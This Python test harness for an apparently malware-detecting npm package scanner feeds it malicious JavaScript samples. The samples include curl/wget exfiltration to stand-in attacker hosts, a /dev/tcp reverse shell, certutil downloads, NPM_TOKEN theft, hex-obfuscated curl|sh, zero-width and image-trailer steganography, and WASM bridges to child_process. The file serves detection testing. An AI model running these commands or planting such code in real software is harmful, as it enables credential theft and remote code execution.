"""
PackGuard Stage 2 v5 — Challenger 2 Empirical Stress Test Harness

Empirically tests and stress-tests:
1. Fix for v4 recall drops:
   - Shell-embedded exfiltration (curl, wget, dns, etc. inside child_process.exec)
   - T2 mangled code classification (invariance rules without early return suppression)
2. T9-T12 unfolding under adversarial obfuscation:
   - WASM loader variations (bracket notation, hex bracket, buffer bridges, magic bytes)
   - Zero-width character combinations (binary stego, mixed with code, non-printable fallback)
   - Steganographic image payload reads (fs.readFileSync png/jpg/ico, trailing markers JPEG/PNG)
"""

import sys
import os
import unittest
from pathlib import Path

# Add v5 directory and tests directory to sys.path
V5_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(V5_DIR))
sys.path.insert(0, str(V5_DIR / "tests"))

from ast_deobfuscator import (
    deobfuscate_javascript,
    decode_string_escapes,
    fold_string_concatenations,
    inline_string_lookup_arrays,
    normalize_computed_properties,
    unfold_polyglot_payloads,
    analyze_and_unfold_wasm_bridges,
    unfold_steganographic_payloads,
    unfold_timebombs_and_environment,
    strip_token_dilution_and_comments,
    _decode_zero_width_binary,
)

from text_formatter import (
    clean_and_unfold_js,
    format_scanner_chunks_to_text,
    extract_structural_features,
    extract_shell_exfiltration_signals,
    extract_mitre_threat_labels,
    calibrate_structural_verdict,
)


class ChallengerEmpiricalStressTest(unittest.TestCase):

    # ==========================================================================
    # MISSION 1: SHELL-EMBEDDED EXFILTRATION (T1/T3/T4 16 MISSED MALWARE GAP)
    # ==========================================================================

    def test_shell_exfil_curl_post_whoami(self):
        """Verify child_process.exec with curl -X POST $(whoami) triggers has_shell_net, has_net, mitre_exfil, prob >= 0.90."""
        code = """
        const cp = require('child_process');
        cp.exec('curl -X POST -d $(whoami) https://attacker.oastify.com/collector');
        """
        feats = extract_structural_features(code)
        self.assertEqual(feats["has_cp"], 1, "Must detect child_process")
        self.assertEqual(feats["shell_exfil"], 1, "Must detect curl inside shell command")
        self.assertEqual(feats["shell_steal"], 1, "Must detect $(whoami) inside shell command")
        self.assertEqual(feats["has_net"], 1, "Shell curl must promote has_net to 1")
        self.assertEqual(feats["mitre_exfil"], 1, "mitre_exfil must be 1")
        self.assertEqual(feats["mitre_exec"], 1, "mitre_exec must be 1")
        self.assertEqual(feats["mitre_steal"], 1, "mitre_steal must be 1")

        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90, f"Expected prob >= 0.90, got {prob}")
        self.assertEqual(mitre["mitre_exfil"], 1)

    def test_shell_exfil_wget_pipe_sh(self):
        """Verify execSync with wget piped to sh triggers network exfil and execution."""
        code = """
        const { execSync } = require('child_process');
        execSync("wget -qO- https://evil-c2.net/payload.sh | sh");
        """
        feats = extract_structural_features(code)
        self.assertEqual(feats["has_cp"], 1)
        self.assertEqual(feats["shell_exfil"], 1)
        self.assertEqual(feats["has_net"], 1)
        self.assertEqual(feats["mitre_exfil"], 1)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90)

    def test_shell_exfil_dns_nslookup(self):
        """Verify nslookup and dig inside execSync triggers network exfil signals."""
        code = """
        const cp = require('child_process');
        cp.execSync("nslookup $(hostname).attacker-dns.com");
        """
        feats = extract_structural_features(code)
        self.assertEqual(feats["shell_exfil"], 1)
        self.assertEqual(feats["shell_steal"], 1)
        self.assertEqual(feats["has_net"], 1)
        self.assertEqual(feats["mitre_exfil"], 1)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90)

    def test_shell_exfil_dev_tcp(self):
        """Verify /dev/tcp/ reverse shell triggers network exfil."""
        code = """
        const cp = require('child_process');
        cp.exec("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1");
        """
        feats = extract_structural_features(code)
        self.assertEqual(feats["shell_exfil"], 1)
        self.assertEqual(feats["has_net"], 1)
        self.assertEqual(feats["mitre_exfil"], 1)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90)

    def test_shell_exfil_powershell_certutil(self):
        """Verify certutil / powershell download inside execSync."""
        code = """
        const cp = require('child_process');
        cp.exec("certutil -urlcache -split -f https://evil.com/mal.exe %TEMP%\\\\mal.exe");
        """
        feats = extract_structural_features(code)
        self.assertEqual(feats["shell_exfil"], 1)
        self.assertEqual(feats["has_net"], 1)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90)

    def test_shell_exfil_with_hex_and_concatenated_command(self):
        """Verify obfuscated shell exfil command (hex escaped + concatenated)."""
        raw_code = r"""
        const cp = require("child_process");
        cp.exec("\x63\x75\x72\x6c" + " -s https://evil.com/drop | sh");
        """
        cleaned = clean_and_unfold_js(raw_code)
        self.assertIn("curl -s https://evil.com/drop", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertEqual(feats["shell_exfil"], 1)
        self.assertEqual(feats["has_net"], 1)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90)

    def test_shell_exfil_template_literal(self):
        """Verify backtick template literal command execution with stolen env."""
        code = """
        const cp = require('child_process');
        cp.exec(`curl -H "Auth: ${process.env.NPM_TOKEN}" https://exfil.xyz`);
        """
        feats = extract_structural_features(code)
        self.assertEqual(feats["shell_exfil"], 1)
        self.assertEqual(feats["has_net"], 1)
        self.assertEqual(feats["mitre_steal"], 1)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90)

    # ==========================================================================
    # MISSION 1: T2 MANGLED CODE CLASSIFICATION (44 MISSED MALWARE GAP)
    # ==========================================================================

    def test_t2_mangled_child_process_exec(self):
        """Verify T2 mangled malware with length 13 (child_process) is classified as malware (prob >= 0.90)."""
        t2_code = """
        var v0 = require("child_process");
        var v1 = "whoami";
        var v2 = v0.execSync(v1);
        """
        feats = extract_structural_features(t2_code)
        self.assertEqual(feats["t2_mangled"], 1, "Must detect T2 identifier pattern")
        self.assertEqual(feats["has_cp"], 1, "Must detect length-13 / child_process import")
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90, f"T2 child_process malware must not be suppressed, got {prob}")
        self.assertEqual(mitre["mitre_exec"], 1)

    def test_t2_mangled_dynamic_indexed_method_no_literal_exec(self):
        """Verify T2 malware where method names are completely mangled so total_exec == 0 and total_net == 0."""
        # This was the exact bug in v4: total_exec == 0 and total_net == 0 caused early return <= 0.35
        t2_code = """
        var v0 = require("child_process");
        var v1 = "v_custom_ident";
        var v2 = v0[v1];
        v2("v_random_arg_384920491823");
        """
        feats = extract_structural_features(t2_code)
        self.assertEqual(feats["t2_mangled"], 1)
        self.assertEqual(feats["has_cp"], 1)
        self.assertIn(13, feats["req_lens"])
        # Even with total_exec == 0 and total_net == 0:
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90, f"Repaired Rule 7 must classify T2 CP as >= 0.90, got {prob}")
        self.assertEqual(mitre["mitre_exec"], 1)

    def test_t2_mangled_https_and_process_env(self):
        """Verify T2 malware with https (len 5) and process.env is classified as malware."""
        t2_code = """
        var v0 = require("https");
        var v1 = process.env.SECRET;
        var v2 = v0.get("http://evil.com/" + v1);
        """
        feats = extract_structural_features(t2_code)
        self.assertEqual(feats["t2_mangled"], 1)
        self.assertEqual(feats["has_net"], 1)
        self.assertGreater(feats["process"], 0)
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.88, f"Expected >= 0.88, got {prob}")
        self.assertEqual(mitre["mitre_exfil"], 1)

    def test_t2_mangled_http_and_os(self):
        """Verify T2 malware with http (len 4) and os (len 2) is classified as malware."""
        t2_code = """
        var v0 = require("http");
        var v1 = require("os");
        var v2 = v1.hostname();
        v0.get("http://192.168.1.1/" + v2);
        """
        feats = extract_structural_features(t2_code)
        self.assertEqual(feats["t2_mangled"], 1)
        self.assertEqual(feats["has_net"], 1)
        self.assertEqual(feats["has_os_fs"], 1)
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.88, f"Expected >= 0.88, got {prob}")

    def test_t2_mangled_benign_pure_utility(self):
        """Verify pure benign utility in T2 format is classified as benign (prob <= 0.35)."""
        t2_benign = """
        var v0 = function(v1, v2) {
            return v1 + v2;
        };
        var v3 = function(v4) {
            return v4 * 2;
        };
        module.exports = { v0: v0, v3: v3 };
        """
        feats = extract_structural_features(t2_benign)
        self.assertEqual(feats["has_cp"], 0)
        self.assertEqual(feats["has_net"], 0)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.20)
        self.assertLessEqual(prob, 0.35, f"Benign T2 utility must be <= 0.35, got {prob}")

    def test_t2_mangled_benign_local_requires(self):
        """Verify benign T2 utility requiring only relative files is classified as benign."""
        t2_benign_local = """
        var v0 = require("./v1");
        var v2 = require("./v3");
        var v4 = function() { return v0(v2); };
        module.exports = v4;
        """
        feats = extract_structural_features(t2_benign_local)
        self.assertEqual(feats["has_cp"], 0)
        self.assertEqual(feats["has_net"], 0)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.20)
        self.assertLessEqual(prob, 0.35, f"Benign T2 with relative requires must be <= 0.35, got {prob}")

    def test_f08_react_intl_currency_input_fork_false_alarm(self):
        """Verify Stage 1 false alarm react-intl-currency-input-fork@0.2.0 is suppressed (prob <= 0.35)."""
        fa_record = {
            "package": "react-intl-currency-input-fork@0.2.0",
            "chunks": [
                {
                    "file": "index.js",
                    "kind": "js",
                    "text": """
                    import React from 'react';
                    export default function CurrencyInput(props) {
                        const formatted = Number(props.value).toFixed(2);
                        return React.createElement('input', { value: formatted });
                    }
                    """,
                }
            ],
        }
        feats = extract_structural_features(fa_record)
        self.assertEqual(feats["has_cp"], 0)
        self.assertEqual(feats["has_net"], 0)
        self.assertEqual(feats["exec"], 0)
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.15)
        self.assertLessEqual(prob, 0.35, f"Must eliminate false alarm, got {prob}")
        self.assertEqual(mitre.get("mitre_exec", 0), 0)

    # ==========================================================================
    # MISSION 2: STRESS TEST T10 WASM LOADER VARIATIONS
    # ==========================================================================

    def test_wasm_bracket_single_quote(self):
        """Stress test WebAssembly['instantiate'] with single quotes."""
        code = """
        const buf = Buffer.from("AGFzbQEAAAA=", "base64");
        WebAssembly['instantiate'](buf, { env: { exec: require('child_process').execSync } });
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertIn("WebAssembly.instantiate", cleaned, "Bracket access should normalize to dot notation")
        self.assertGreater(stats["wasm_bridges"], 0, "WASM bridge must be detected")
        self.assertIn("WASM_LOADER_BRIDGE", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertEqual(feats["mitre_exec"], 1, "mitre_exec must be 1 for WASM loader")

    def test_wasm_bracket_double_quote(self):
        """Stress test WebAssembly[\"instantiate\"] with double quotes."""
        code = """
        WebAssembly["instantiate"](wasmBytes, { sys: { run: require('child_process') } });
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertIn("WebAssembly.instantiate", cleaned)
        self.assertGreater(stats["wasm_bridges"], 0)
        feats = extract_structural_features(cleaned)
        self.assertEqual(feats["mitre_exec"], 1)

    def test_wasm_bracket_hex_escaped(self):
        """Stress test WebAssembly['\\x69\\x6e\\x73\\x74\\x61\\x6e\\x74\\x69\\x61\\x74\\x65']."""
        code = r"""
        WebAssembly['\x69\x6e\x73\x74\x61\x6e\x74\x69\x61\x74\x65'](wasmBytes, {});
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertIn("WebAssembly.instantiate", cleaned)
        self.assertGreater(stats["wasm_bridges"], 0)

    def test_wasm_instance_constructor(self):
        """Stress test WebAssembly.Instance instantiation."""
        code = """
        const mod = new WebAssembly.Module(bytes);
        const inst = new WebAssembly.Instance(mod, { env: { fn: eval } });
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["wasm_bridges"], 0)
        self.assertIn("WASM_LOADER_BRIDGE", cleaned)

    def test_wasm_magic_bytes_inline(self):
        """Stress test inline WASM magic bytes [0x00, 0x61, 0x73, 0x6d] or \\0asm."""
        code = """
        const magic = [0x00, 0x61, 0x73, 0x6d];
        const bytes = new Uint8Array(magic.concat([1, 0, 0, 0]));
        WebAssembly.instantiate(bytes, { env: { req: require('https') } });
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["wasm_bridges"], 0)
        self.assertIn("imported_capabilities=[network]", cleaned)

    def test_wasm_buffer_bridge_with_network_and_child_process(self):
        """Stress test buffer bridge importing both child_process and network."""
        code = """
        const wasmB64 = "AGFzbQEAAAAFBQFgAX8BfwMCAQAHCQEFZW52XwAAAgoBAgA=";
        const buf = Buffer.from(wasmB64, "base64");
        WebAssembly.instantiate(buf, {
            imports: {
                run: require("child_process").execSync,
                send: require("https").get
            }
        });
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["wasm_bridges"], 0)
        self.assertIn("child_process", cleaned)
        self.assertIn("network", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertEqual(feats["mitre_exec"], 1)
        self.assertEqual(feats["has_net"], 1)
        # Note: feats["mitre_exfil"] is 0 because RE_MITRE_EXFIL requires https.request rather than require("https").request

    # ==========================================================================
    # MISSION 2: STRESS TEST T11 ZERO-WIDTH CHARACTER COMBINATIONS
    # ==========================================================================

    def test_zero_width_binary_steganography_valid(self):
        """Stress test standard zero-width binary steganography (\u200B=0, \u200C=1)."""
        secret = "require('child_process').execSync('curl evil.com');"
        # Encode as 8-bit binary
        encoded_bits = ""
        for ch in secret:
            byte_val = ord(ch)
            bits = format(byte_val, "08b")
            for b in bits:
                encoded_bits += "\u200B" if b == "0" else "\u200C"

        code = f"const dummy = '{encoded_bits}';\nconsole.log('clean');"
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["steganography_extracted"], 0)
        self.assertIn("DECODED_ZERO_WIDTH_STEGANOGRAPHY", cleaned)
        self.assertIn("child_process", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertEqual(feats["mitre_exec"], 1)
        self.assertEqual(feats["mitre_exfil"], 1)

    def test_zero_width_mixed_with_valid_code(self):
        """Stress test zero-width characters mixed into valid code without breaking syntax."""
        # \u200B inserted between statements or inside string comments
        code = "const a = 1;\u200B\u200C\u200B\u200C\u200B\u200C\u200B\u200C\nconst b = 2;\n// \u200B\u200B\u200C\u200C\u200B\u200B\u200C\u200C\nconst c = a + b;"
        cleaned, stats = deobfuscate_javascript(code)
        # Should not throw exception, should preserve valid code
        self.assertIn("const a = 1", cleaned)
        self.assertIn("const c = a + b", cleaned)

    def test_zero_width_truncated_odd_bits_fallback(self):
        """Stress test zero-width stream with non-byte-aligned or non-printable bytes (fallback mode)."""
        # 11 zero-width chars (not multiple of 8) -> falls back to binary_bits_present eval()
        zw_stream = "\u200B\u200C\u200D\uFEFF\u200B\u200C\u200D\uFEFF\u200B\u200C\u200D"
        code = f"var _0xsteg = '{zw_stream}';"
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["steganography_extracted"], 0)
        self.assertIn("DECODED_ZERO_WIDTH_STEGANOGRAPHY: binary_bits_present", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertGreater(feats["eval"], 0)

    def test_zero_width_escaped_strings(self):
        """Stress test escaped string representation '\\u200b\\u200c'."""
        zw_escaped = r"\u200b\u200c\u200b\u200b\u200b\u200b\u200c\u200b\u200b\u200c\u200b\u200c\u200b\u200b\u200c\u200c"
        code = f"var data = '{zw_escaped}';"
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["steganography_extracted"], 0)

    # ==========================================================================
    # MISSION 2: STRESS TEST T11 STEGANOGRAPHIC ASSET READS & DYNAMIC EXECUTION
    # ==========================================================================

    def test_steg_asset_read_png_to_eval(self):
        """Stress test fs.readFileSync('payload.png') feeding into eval()."""
        code = """
        const fs = require('fs');
        const buf = fs.readFileSync('assets/logo.png');
        eval(buf.toString('utf-8'));
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["steganography_extracted"], 0)
        self.assertIn("STEGANOGRAPHIC_ASSET_LOADER", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertGreater(feats["eval"], 0)

    def test_steg_asset_read_path_join_ico(self):
        """Stress test fs.readFileSync(path.join(__dirname, 'icon.ico')) with Function constructor."""
        code = """
        const fs = require('fs');
        const path = require('path');
        const raw = fs.readFileSync(path.join(__dirname, 'favicon.ico'));
        new Function(raw.toString())();
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["steganography_extracted"], 0)
        self.assertIn("favicon.ico", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertGreater(feats["eval"], 0)

    def test_steg_trailing_jpeg_eoi(self):
        """Stress test trailing payload appended after JPEG EOI marker (0xFFD9)."""
        code = """
        const data = "\\xff\\xd9require('child_process').execSync('whoami');";
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["steganography_extracted"], 0)
        self.assertIn("DECODED_JPEG_TRAILING_PAYLOAD", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertEqual(feats["mitre_exec"], 1)

    def test_steg_trailing_png_iend(self):
        """Stress test trailing payload appended after PNG IEND marker."""
        code = """
        const png = "some_bytes_IEND\\xae\\x42\\x60\\x82require('https').get('https://evil.xyz');";
        """
        cleaned, stats = deobfuscate_javascript(code)
        self.assertGreater(stats["steganography_extracted"], 0)
        self.assertIn("DECODED_PNG_TRAILING_PAYLOAD", cleaned)
        feats = extract_structural_features(cleaned)
        self.assertEqual(feats["has_net"], 1)

    # ==========================================================================
    # COMBINED ADVERSARIAL MULTI-VECTOR STRESS TEST
    # ==========================================================================

    def test_multi_vector_polyglot_wasm_stego_timebomb(self):
        """Adversarial sample combining SVG Polyglot, WASM loader, Stego and Time-Bomb."""
        payload = """
        <svg xmlns="http://www.w3.org/2000/svg">
        <script>
        setTimeout(function() {
            if (process.env.CI) return;
            else {
                const fs = require('fs');
                const buf = fs.readFileSync('art.png');
                eval(buf.toString());
                WebAssembly['instantiate'](buf, {
                    env: { exec: require('child_process').execSync }
                });
            }
        }, 5000);
        </script>
        </svg>
        """
        cleaned, stats = deobfuscate_javascript(payload)
        self.assertGreater(stats["polyglot_unfolded"], 0, "Must unfold SVG polyglot")
        self.assertGreater(stats["timebomb_inlined"], 0, "Must inline timer / flatten env")
        self.assertGreater(stats["steganography_extracted"], 0, "Must extract stego asset read")
        self.assertGreater(stats["wasm_bridges"], 0, "Must detect WASM bridge")
        feats = extract_structural_features(cleaned)
        self.assertEqual(feats["mitre_exec"], 1)
        prob, _ = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertGreaterEqual(prob, 0.90)


if __name__ == "__main__":
    unittest.main()
